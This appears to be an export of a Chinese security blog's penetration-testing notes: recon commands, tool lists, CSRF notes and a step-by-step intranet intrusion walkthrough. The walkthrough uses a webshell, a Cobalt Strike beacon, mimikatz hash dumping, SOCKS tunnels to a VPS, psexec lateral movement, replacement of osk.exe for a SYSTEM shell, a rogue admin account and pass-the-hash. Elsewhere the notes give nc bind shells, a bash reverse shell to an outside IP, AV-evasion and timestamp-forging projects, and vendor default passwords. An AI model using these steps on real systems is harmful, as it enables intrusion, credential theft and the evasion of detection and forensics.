<td>查看计划任务信息</td>
</tr>
<tr>
<td align="left">net statistics workstation</td>
<td>查看主机开机时间</td>
</tr>
<tr>
<td align="left">net user</td>
<td>查询用户列表信息</td>
</tr>
<tr>
<td align="left">net localgroup administrators</td>
<td>获取本地管理员（通常含有域用户）</td>
</tr>
<tr>
<td align="left">query user || qwinsta</td>
<td>查看当前在线用户信息</td>
</tr>
<tr>
<td align="left">net session</td>
<td>查客户端会话信息(管理员权限)</td>
</tr>
<tr>
<td align="left"><code>netstat -ano</code></td>
<td>查询端口列表信息</td>
</tr>
<tr>
<td align="left"><code>Systeminfo</code></td>
<td>查询补丁列表信息</td>
</tr>
<tr>
<td align="left">wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>wmic来识别安装在系统中的补丁</td>
</tr>
<tr>
<td align="left"><code>net share</code></td>
<td>查看本机共享信息</td>
</tr>
</tbody></table>
<span id="more"></span>

<h1 id="LINUX常用搜集命令："><a href="#LINUX常用搜集命令：" class="headerlink" title="LINUX常用搜集命令："></a>LINUX常用搜集命令：</h1><table>
<thead>
<tr>
<th><code>ifconfig -a</code> 或 <code>ip a</code></th>
<th>查询网络配置信息</th>
</tr>
</thead>
<tbody><tr>
<td><code>uname -a</code></td>
<td>查询系统内核及版本信息</td>
</tr>
<tr>
<td><code>cat /etc/os-release</code> 或 <code>lsb_release -a</code></td>
<td>查询操作系统版本信息</td>
</tr>
<tr>
<td><code>arch</code> 或 <code>uname -m</code></td>
<td>查看系统体系结构</td>
</tr>
<tr>
<td><code>dpkg -l</code> (Debian&#x2F;Ubuntu) 或 <code>rpm -qa</code> (RHEL&#x2F;CentOS)</td>
<td>安装软件版本信息</td>
</tr>
<tr>
<td><code>service --status-all</code> 或 <code>systemctl list-units --type=service</code></td>
<td>查询本机服务信息</td>
</tr>
<tr>
<td><code>ps aux</code></td>
<td>查询进程列表信息</td>
</tr>
<tr>
<td><code>ls /etc/init.d/</code> 或 <code>ls /etc/systemd/system/</code></td>
<td>查看启动程序信息</td>
</tr>
<tr>
<td><code>crontab -l</code> 或 <code>ls /etc/cron.*</code></td>
<td>查看计划任务信息</td>
</tr>
<tr>
<td><code>uptime</code></td>
<td>查看主机运行时间</td>
</tr>
<tr>
<td><code>cat /etc/passwd</code></td>
<td>查询用户列表信息</td>
</tr>
<tr>
<td><code>cat /etc/group</code></td>
<td>获取用户组信息（包括管理员组）</td>
</tr>
<tr>
<td><code>who</code> 或 <code>w</code></td>
<td>查看当前在线用户信息</td>
</tr>
<tr>
<td><code>netstat -antp</code> 或 <code>ss -tulnp</code></td>
<td>查询端口列表信息</td>
</tr>
<tr>
<td><code>apt list --installed</code> (Debian&#x2F;Ubuntu) 或 <code>yum list installed</code> (RHEL&#x2F;CentOS)</td>
<td>查询已安装软件包（包含部分补丁信息）</td>
</tr>
<tr>
<td><code>ls /mnt/</code> 或 <code>mount</code></td>
<td>查看挂载的共享信息</td>
</tr>
<tr>
<td><code>df -h</code></td>
<td>查看磁盘使用情况</td>
</tr>
<tr>
<td><code>free -h</code></td>
<td>查看内存使用情况</td>
</tr>
<tr>
<td><code>lscpu</code></td>
<td>查看CPU信息</td>
</tr>
<tr>
<td><code>dmidecode -t system</code></td>
<td>查看系统硬件信息（需要root权限）</td>
</tr>
<tr>
<td><code>journalctl -u &lt;service_name&gt;</code></td>
<td>查看特定服务的日志信息</td>
</tr>
<tr>
<td><code>cat /etc/hosts</code></td>
<td>查看主机名和IP映射</td>
</tr>
<tr>
<td><code>hostnamectl</code></td>
<td>查看主机名和系统信息</td>
</tr>
</tbody></table>
<p>注：</p>
<ol>
<li>部分命令可能需要root权限才能获取完整信息（可在命令前加<code>sudo</code>）</li>
<li>不同Linux发行版可能需要使用对应的包管理命令（apt&#x2F;yum&#x2F;dnf等）</li>
<li>对于较新的系统，推荐使用<code>ip</code>替代<code>ifconfig</code>，使用<code>ss</code>替代<code>netstat</code></li>
</ol>
<h1 id="内存码的注入："><a href="#内存码的注入：" class="headerlink" title="内存码的注入："></a>内存码的注入：</h1><p>[内存马注入]: <a href="https://github.com/pap1rman/JNDIExploit-modify">https://github.com/pap1rman/JNDIExploit-modify</a>	“参考如下：”</p>
<ul>
<li><a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></li>
<li><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></li>
<li><a href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
</ul>
<h1 id="完整的内网渗透"><a href="#完整的内网渗透" class="headerlink" title="完整的内网渗透"></a>完整的内网渗透</h1><h2 id="简略："><a href="#简略：" class="headerlink" title="简略："></a>简略：</h2><p>1.获取shell—无论是sql注入提权还是webshell还是直接ssh等，获取shell后</p>
<p>2.cs上线—下载powershell等工具或者jar直接上线</p>
<p>3.如上信息搜集，进行横向，域内横向，类似于操作1.直接找shell</p>
<p>（3）.可以尝试<strong>sock代理</strong>，使同一网，进行msf的扫描，有的话就是捷径</p>
<p>（3）.有备份的话可以直接拷贝<strong>全量备份</strong>，它能在你本地横？可以cmd覆盖</p>
<p>（3）.<strong>基础操作</strong>：主机端口，内网web，系统&#x2F;框架漏洞</p>
<p>(技巧)[<a href="https://www.cnblogs.com/backlion/category/1181220.html]">https://www.cnblogs.com/backlion/category/1181220.html]</a></p>
<h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><p>1.通过fofa搜索到目标系统是采用weblogic框架，通过weblogic利用工具可执行命令，这里上传冰蝎一句话到目标网站系统。并查询到目标系统存在小众的防火墙，经测试该防火墙对ps脚本不拦截。</p>
<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershell。</p>
<p>URL路径：&#x2F;a&#x2F;123   主机地址：目标系统IP   端口：80  监听器：https   类型：posershell</p>
<p>3.执行powershel，然后CS成功上线。</p>
<p>4.通过C命令查询目标系统信息,发现目标系统是win2012 ，目标内网IP为192.168.200.21</p>
<p>shell systeminfo</p>
<p>shell ipconfig</p>
<p>5。通过cs将ladon上传到目标系统中，通过ladon扫描内网系统.,发现目标有一个WEB服务主机。</p>
<p>landon 192.168.200.1&#x2F;24    OsScan</p>
<p>6。通过mimikatz成功读取到用户名和密码hash值，通过md5对密码的NTML进行解密，成功解密为P@sssw0rd。</p>
<p>7,通过ladon进行批量ms17-010扫描，发现存有几个系统存在ms17-010漏洞</p>
<p>landon 192.168.200.1&#x2F;24 MS17010</p>
<p>8.在公网VPS上执行以下命令，将1900端口收到的代理请求转交给反连1200端口的主机</p>
<p>ew -s rcsocks -l 1900 -e 1200</p>
<p>9.将ew通过冰蝎上传目标系统中，并执行以下命令,开启目标主机socks5服务并反向连接到中转机器的1200端口</p>
<p>ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e 1200</p>
<p>10.本地WINDOWS在本地使用sockscap配置好socke5代理，本地虚拟机里面的kali的MSF，kali的代理配置比较方便，先vim &#x2F;etc&#x2F;proxychains.conf ，添加sock5嗲了</p>
<p>socks5  目标IP  1900</p>
<p>11.在kali下msf要挂代理，就直接：proxychains msfconsole，在windows中sockscap添加ie浏览器访问的socks5代理，用于内网web访问，但是测试弱口令发现无法进入。</p>
<p>12.继续信息收集，查看登录凭证，并有任何东西</p>
<p>shell  cmdkey  &#x2F;l</p>
<p>13.查看共享计算机列表，并尝试访问计算机C盘,发现备份计算机可以访问共享</p>
<p>shell  ne  view</p>
<p>ls   \VEEAM-BACKUP$</p>
<p>14.通过ping目标共享计算机，查询出IP地址为192.168.200.6</p>
<p>ping   VEEAM-BACKUP</p>
<p>15.在CS上创建一个监听器</p>
<p>中转—监听—名字（c2)、payload(windows&#x2F;beacon_reverse_tcp)、listen host :192.168.200.21  、listen port:4444</p>
<p>16.接着使用psexec_psh尝试上线192.168.200.6这台服务器,成功上线，起初发现该主机上并没有任何东西</p>
<p>jump  psexec _psh  192.168.200.6</p>
<p>17.通过之前ladon探测发现内网中22,1,5,11主机是linux系统，尝试弱口令，发现192.168.200.22存在弱口令，linux主机上并没有任何可利用的</p>
<p>ssh  192.168.200.22  root  123456</p>
<p>18.在VEEAM-BACKUP主机上发现了有一个Backup的文件，里面存放了三个机器的备份，它是一款叫Veeam® Backup &amp; Replication的软件，他的功能是专门为Vsphere等做备份。</p>
<p>19.发现VEEAM-BACKUP不出外网，这里通过7z将Backup文件进行命令打包压缩。在目标系统中的web目录下，通过命令共享将Backup文件拷贝到目标系统中。</p>
<p>19.在本地安装Backup &amp; Replication，并将备份文件进行恢复还原，发现登录窗口处有默认的用户名和密码以及IP，这个需要在目标内网中登录，这里可以通过在目标系统中通过cs开启sock4代理，本地通过Proxifier加载Backup &amp; Replication的sock4代理成功访问。</p>
<p>20.本地下载的那个全量备份在本地还原也很简单，只需要装了软件双击就回自动打开软件进行还原</p>
<p>21.通过老毛桃的win pe进入系统，这里重命名cmd.exe为osk.exe将原来C盘中的\windows\system32\osk.exe给覆盖了，这样子在开机的时候打开屏幕键盘就会弹出SYSTEM权限的命令行。</p>
<p>22.通过命令查询，发现还原的系统是域普通主机，这里通过命令添加用并将域用户修改密码后添加到本地管理员组成功进入了系统。</p>
<p>net user   hanli  quer1345 @  &#x2F;add</p>
<p>net localgroup administrators  hanli  &#x2F;add</p>
<p>23.在虚拟机中通过执行cs的后门成功上线，并通过cs的hasdump读取hash,并通过该hash进行域控HASH传递</p>
<h2 id="免杀项目："><a href="#免杀项目：" class="headerlink" title="免杀项目："></a>免杀项目：</h2><p><a href="https://github.com/wangfly-me/LoaderFly">https://github.com/wangfly-me/LoaderFly</a></p>
<p><a href="https://github.com/Pizz33/Qianji">https://github.com/Pizz33/Qianji</a></p>
<p>可以定期去github上关注一些好用的bof</p>
<h1 id="应对技巧："><a href="#应对技巧：" class="headerlink" title="应对技巧："></a>应对技巧：</h1><p>1.上传的木马都是新的</p>
<p>​	可以查看更改时间和最近操作得到，得到直接保存沙盒删除溯源一条龙</p>
<p>注：<a href="https://github.com/MsF-NTDLL/ChTimeStamp">https://github.com/MsF-NTDLL/ChTimeStamp</a></p>
<p>该项目可以实现修改文件时间</p>
<h1 id="默认口令："><a href="#默认口令：" class="headerlink" title="默认口令："></a>默认口令：</h1><p>系统管理员：system&#x2F;system<br>    集团管理员(A8-v5集团版) group-admin&#x2F;123456<br>    单位管理员(A8-V5企业版) admin1&#x2F;admin123456<br>    审计管理员(所有版本) audit-admin&#x2F;seeyon123456</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Computer-info</tag>
      </tags>
  </entry>
  <entry>
    <title>命令的熟悉</title>
    <url>/2025/04/23/%E5%91%BD%E4%BB%A4%E7%9A%84%E7%86%9F%E6%82%89/</url>
    <content><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nc、ls、待补充</p>
<span id="more"></span>

<h3 id="nc"><a href="#nc" class="headerlink" title="nc:"></a>nc:</h3><p>​	常用：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正向连接</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> /bin/bash <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#反向连接</span></span><br><span class="line">bash <span class="literal">-i</span> &gt; /dev/tcp/<span class="number">81</span>.X.X.X/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#只允许192.168.1.100连接</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">6666</span> <span class="literal">-e</span> <span class="string">&quot;/bin/bash -i&quot;</span> <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听并记录访问者信息</span></span><br><span class="line"></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-v</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">tee</span> <span class="literal">-a</span> access.log</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th align="left"><strong>用途</strong></th>
<th align="left"><strong>命令示例</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">临时聊天</td>
<td align="left"><code>nc -l -p 8080</code> + <code>nc &lt;IP&gt; 8080</code></td>
<td align="left">双向文本通信</td>
</tr>
<tr>
<td align="left">文件传输（发送→接收）</td>
<td align="left"><code>nc -l -p 8080 &gt; file</code> + <code>nc &lt;IP&gt; 8080 &lt; file</code></td>
<td align="left">替代SCP&#x2F;FTP</td>
</tr>
<tr>
<td align="left">反向Shell</td>
<td align="left"><code>nc -l -p 8080 -e /bin/bash</code> + <code>nc &lt;IP&gt; 8080</code></td>
<td align="left"><strong>高风险！仅测试用</strong></td>
</tr>
<tr>
<td align="left">端口扫描</td>
<td align="left"><code>nc -zv &lt;IP&gt; 8080</code></td>
<td align="left">检查端口状态</td>
</tr>
<tr>
<td align="left">HTTP调试</td>
<td align="left"><code>nc -l -p 8080</code> + <code>curl http://&lt;IP&gt;:8080</code></td>
<td align="left">查看原始HTTP请求</td>
</tr>
<tr>
<td align="left">TCP代理</td>
<td align="left">&#96;nc -l -p 8080</td>
<td align="left">nc &lt;目标IP&gt; 80&#96;</td>
</tr>
<tr>
<td align="left">十六进制调试</td>
<td align="left">&#96;nc -l -p 8080</td>
<td align="left">hexdump -C&#96;</td>
</tr>
<tr>
<td align="left">持久监听</td>
<td align="left"><code>while true; do nc -l -p 8080; done</code></td>
<td align="left">支持多次连接</td>
</tr>
<tr>
<td align="left">SSL加密通信</td>
<td align="left"><code>ncat -l -p 8080 --ssl</code> + <code>ncat &lt;IP&gt; 8080 --ssl</code></td>
<td align="left">需安装<code>ncat</code></td>
</tr>
</tbody></table>
<p>注：nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i”			&#x2F;&#x2F;j交互模式</p>
<p>​	nc -l -p 8080 -e “&#x2F;bin&#x2F;bash -i 2&gt;&amp;1”		&#x2F;&#x2F;全回显，2&gt;&amp;1 表示将 标准错误（stderr） 重定向到 标准输出（stdout），确保错误信息也能回显。</p>
<table>
<thead>
<tr>
<th align="left">需求</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">简单回显（<code>nc</code>）</td>
<td align="left"><code>nc -l -p 8080 -e &quot;/bin/bash -i 2&gt;&amp;1&quot;</code></td>
</tr>
<tr>
<td align="left">完整终端支持（<code>nc</code>）</td>
<td align="left"><code>nc -l -p 8080 -e &quot;script -q -c &#39;/bin/bash -i&#39; /dev/null 2&gt;&amp;1&quot;</code></td>
</tr>
<tr>
<td align="left">最佳兼容性（<code>socat</code>）</td>
<td align="left"><code>socat TCP-LISTEN:8080,reuseaddr,fork EXEC:&quot;/bin/bash -i&quot;,pty,stderr</code></td>
</tr>
</tbody></table>
<h3 id="应急："><a href="#应急：" class="headerlink" title="应急："></a>应急：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找 nc 进程</span></span><br><span class="line">ps aux | grep &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接用 pkill 终止所有 nc 进程</span></span><br><span class="line">pkill -f &#x27;nc -l&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死进程（假设进程ID是 12345）</span></span><br><span class="line">kill 12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者强制杀死</span></span><br><span class="line">kill -9 12345</span><br></pre></td></tr></table></figure>



<h3 id="ls"><a href="#ls" class="headerlink" title="ls:"></a>ls:</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看异常连接</span></span><br><span class="line">netstat <span class="literal">-ano</span> | grep <span class="string">&#x27;:8080&#x27;</span></span><br><span class="line">ss <span class="literal">-tulnp</span> | grep <span class="string">&#x27;:8080&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看端口占用</span></span><br><span class="line">lsof <span class="literal">-i</span> :<span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">步骤</th>
<th align="left">命令</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1. 查找占用 8080 的 PID</td>
<td align="left">&#96;sudo ss -tulnp</td>
<td align="left">grep ‘:8080’<code>或</code>sudo lsof -i :8080&#96;</td>
</tr>
<tr>
<td align="left">2. 定位可执行文件</td>
<td align="left"><code>sudo ls -l /proc/&lt;PID&gt;/exe</code> 或 <code>sudo readlink -f /proc/&lt;PID&gt;/exe</code></td>
<td align="left">找到程序的真实路径</td>
</tr>
<tr>
<td align="left">3. 检查工作目录</td>
<td align="left"><code>sudo ls -l /proc/&lt;PID&gt;/cwd</code></td>
<td align="left">查看程序运行时的工作目录</td>
</tr>
</tbody></table>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap:"></a>nmap:</h3><p>扫描c段</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#基础命令--列出存活主机及其开放端口（默认扫描 <span class="number">1000</span> 个常用端口）</span><br><span class="line">nmap <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#扫描c段存活的全部端口</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">-sV：探测服务版本</span><br><span class="line"></span><br><span class="line">   --open：仅显示开放端口</span><br><span class="line"></span><br><span class="line">   -oN：输出文本报告</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>computer</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透工具&amp;项目推荐</title>
    <url>/2025/04/23/%E9%A1%B9%E7%9B%AE&amp;%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<p><strong>看目录查找，内容未制表</strong></p>
<span id="more"></span>

<h1 id="GitHub项目"><a href="#GitHub项目" class="headerlink" title="GitHub项目"></a>GitHub项目</h1><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件"><a href="#bp插件" class="headerlink" title="bp插件"></a>bp插件</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞"><a href="#探测漏洞" class="headerlink" title="探测漏洞"></a>探测漏洞</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a><a href="https://github.com/zan8in/afrog">afrog</a></h6><h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">nuclei</a></h6><h6 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a><a href="https://github.com/SleepingBag945/dddd">dddd</a></h6><h5 id="框架-服务漏洞"><a href="#框架-服务漏洞" class="headerlink" title="框架&amp;服务漏洞"></a>框架&amp;服务漏洞</h5><h6 id="nacos-p-8848"><a href="#nacos-p-8848" class="headerlink" title="nacos-p-8848"></a><a href="https://github.com/Pizz33/nacos_vul">nacos-p-8848</a></h6><h6 id="winrm-p-5985"><a href="#winrm-p-5985" class="headerlink" title="winrm-p-5985 "></a><a href="https://github.com/Hackplayers/evil-winrm/commits?author=OscarAkaElvis">winrm-p-5985 </a></h6><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><h5 id="存活检测"><a href="#存活检测" class="headerlink" title="存活检测"></a>存活检测</h5><h6 id="存活检测-httpx"><a href="#存活检测-httpx" class="headerlink" title="存活检测-httpx"></a><a href="https://github.com/projectdiscovery/httpx/commits?author=dogancanbakir">存活检测-httpx</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->

<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6><h6 id="cf"><a href="#cf" class="headerlink" title="cf"></a><a href="https://github.com/teamssix/cf/releases">cf</a></h6><h1 id="微软工具推荐"><a href="#微软工具推荐" class="headerlink" title="微软工具推荐"></a>微软工具推荐</h1><h3 id="汇总下载地址"><a href="#汇总下载地址" class="headerlink" title="汇总下载地址"></a>汇总下载地址</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/"> 实用工具汇总</a></p>
<h5 id="进程资源管理器"><a href="#进程资源管理器" class="headerlink" title="进程资源管理器"></a>进程资源管理器</h5><h6 id="进程资源管理器-1"><a href="#进程资源管理器-1" class="headerlink" title="进程资源管理器"></a><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">进程资源管理器</a></h6><h1 id="代理工具推荐"><a href="#代理工具推荐" class="headerlink" title="代理工具推荐"></a>代理工具推荐</h1><h3 id="手机代理工具推荐"><a href="#手机代理工具推荐" class="headerlink" title="手机代理工具推荐"></a>手机代理工具推荐</h3><h6 id="v2rayNG"><a href="#v2rayNG" class="headerlink" title="v2rayNG"></a><a href="https://github.com/2dust/v2rayNG">v2rayNG</a></h6><h6 id="Postern"><a href="#Postern" class="headerlink" title="Postern"></a><a href="https://github.com/postern-overwal/postern-stuff">Postern</a></h6><h6 id="gost【root】"><a href="#gost【root】" class="headerlink" title="gost【root】"></a><a href="https://github.com/ginuerzh/gost/commits?author=ginuerzh">gost</a>【root】</h6><h3 id="手机抓包工具推荐"><a href="#手机抓包工具推荐" class="headerlink" title="手机抓包工具推荐"></a>手机抓包工具推荐</h3><h6 id="tcpdump【root】"><a href="#tcpdump【root】" class="headerlink" title="tcpdump【root】"></a><a href="https://www.androidtcpdump.com/android-tcpdump/downloads?utm_source=chatgpt.com">tcpdump</a>【root】</h6><h6 id="WLAN【系统自带】"><a href="#WLAN【系统自带】" class="headerlink" title="WLAN【系统自带】"></a>WLAN【系统自带】</h6><h3 id="手机流量重定向"><a href="#手机流量重定向" class="headerlink" title="手机流量重定向"></a>手机流量重定向</h3><h6 id="iptables【系统自带】"><a href="#iptables【系统自带】" class="headerlink" title="iptables【系统自带】"></a>iptables【系统自带】</h6><h3 id="渗透代理工具介绍"><a href="#渗透代理工具介绍" class="headerlink" title="渗透代理工具介绍"></a>渗透代理工具介绍</h3><h6 id="yakit"><a href="#yakit" class="headerlink" title="yakit"></a><a href="https://github.com/yaklang/yakit">yakit</a></h6><p>↑中间人【渗透工具】{区别：国产、127可代}</p>
<h6 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a><a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></h6><h6 id="↑中间人【渗透工具】-区别：py高度自定义"><a href="#↑中间人【渗透工具】-区别：py高度自定义" class="headerlink" title="↑中间人【渗透工具】{区别：py高度自定义}"></a>↑中间人【渗透工具】{区别：py高度自定义}</h6><h6 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h6><p>↑【专业渗透工具】{区别：工具多、社区活跃}</p>
<h6 id="openvpn"><a href="#openvpn" class="headerlink" title="openvpn"></a>openvpn</h6><p>↑统一局域网</p>
<h6 id="SocksCap64"><a href="#SocksCap64" class="headerlink" title="SocksCap64"></a><a href="https://github.com/bobo2334/sockscap64/releases">SocksCap64</a></h6><p>↑管理&amp;强制代理{区别Proxifier：免费}</p>
<h6 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h6><p>↑强制代理{区别sockscap64：可看进程}</p>
<h6 id="Fiddler-Classic"><a href="#Fiddler-Classic" class="headerlink" title="Fiddler Classic"></a>Fiddler Classic</h6><p>↑代理【渗透工具】</p>
<h6 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h6><p>↑代理【渗透工具】</p>
<h1 id="框架漏扫工具推荐"><a href="#框架漏扫工具推荐" class="headerlink" title="框架漏扫工具推荐"></a>框架漏扫工具推荐</h1><h3 id="常见框架漏扫工具推荐"><a href="#常见框架漏扫工具推荐" class="headerlink" title="常见框架漏扫工具推荐"></a>常见框架漏扫工具推荐</h3><h5 id="spring-boot框架"><a href="#spring-boot框架" class="headerlink" title="spring-boot框架"></a>spring-boot框架</h5><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6><h6 id="swagger-hack"><a href="#swagger-hack" class="headerlink" title="swagger-hack"></a><a href="https://github.com/jayus0821/swagger-hack">swagger-hack</a></h6><h5 id="thinkphp框架"><a href="#thinkphp框架" class="headerlink" title="thinkphp框架"></a>thinkphp框架</h5><h5 id="Weblogic框架"><a href="#Weblogic框架" class="headerlink" title="Weblogic框架"></a>Weblogic框架</h5><h5 id="nacos框架"><a href="#nacos框架" class="headerlink" title="nacos框架"></a>nacos框架</h5><h6 id="NacosExploit"><a href="#NacosExploit" class="headerlink" title="NacosExploit"></a><strong><a href="https://github.com/h0ny/NacosExploit">NacosExploit</a></strong></h6><h5 id="帆软框架"><a href="#帆软框架" class="headerlink" title="帆软框架"></a>帆软框架</h5><h6 id="Frchannel"><a href="#Frchannel" class="headerlink" title="Frchannel"></a><a href="https://github.com/7wkajk/Frchannel/releases/tag/2">Frchannel</a></h6>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF记录</title>
    <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
<p>get+post_forms</p>
<p>只接受三种类型，text&#x2F;plain、urlendocde、忘了</p>
<p>2-中等</p>
<p>限定type，例如最典型的：post-json</p>
<p>可以尝试几种常见方式 js、flash307、WebSocket、http请求走私等</p>
<p>*浏览器或者所在浏览的平台安全策略严谨的话建议当它没有csrf</p>
<p>3-安全</p>
<p>安全，以目前技术没希望的，或者只能</p>
<p>钓鱼、xss、cors等联合漏洞实现的</p>
<hr>
<span id="more"></span>

<h2 id="flash方法"><a href="#flash方法" class="headerlink" title="flash方法"></a>flash方法</h2><p>若是服务器只校验post+content-type：json且存在请求体，八成相当于没有csrf</p>
<p>利用难点：	打开网址A的时候打开网址B</p>
<p>​			若是网址接收option也可以直接用js操作</p>
<p>​			服务器对发送种类限制，例如：json</p>
<p>正常来说没人管这个csrf，毕竟要联合xss或者其他反射的漏洞才能造成较大危害</p>
<p>可以用（CSRF + Flash + HTTP 307）继续绕过服务器对发送种类限制，例如：json</p>
